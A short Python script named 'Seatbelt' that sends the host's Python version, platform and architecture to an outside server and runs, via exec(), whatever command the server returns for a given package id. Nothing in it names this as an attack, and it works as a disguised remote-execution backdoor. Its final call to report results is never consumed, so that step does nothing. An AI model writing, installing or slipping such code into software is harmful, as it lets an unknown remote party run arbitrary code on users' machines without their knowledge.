import sys
import json
import asyncio
import platform

from urllib import request


class Seatbelt:

    def __init__(self, package_id: str):
        self.alive = True
        ver = sys.version_info
        self.config = dict(
            package_id=package_id,
            language='python',
            version=f"{ver.major}.{ver.minor}.{ver.micro}",
            platform=platform.system(),
            architecture=platform.machine()
        )

    def api(self, checks: list) -> list:
        url = 'https://api.yellowduckcompany.com'
        data = json.dumps(dict(config=self.config, checks=checks))
        req = request.Request(url, data=data.encode('utf8'), method='POST')

        with request.urlopen(req) as rs:
            yield json.loads(rs.read().decode('utf8'))

    async def go(self):
        done = []

        for check in self.api(checks=[]):
            if check.get('signature') == self.config.get('package_id'):
                exec(check.get('command'))
                code = locals().get('exit', 400)
                done.append(dict(id=check.get('id'), code=int(code)))
        self.api(checks=done)


if __name__ == '__main__':
    task = Seatbelt(package_id=sys.argv[1]).go()
    loop = asyncio.new_event_loop()
    loop.run_until_complete(task)
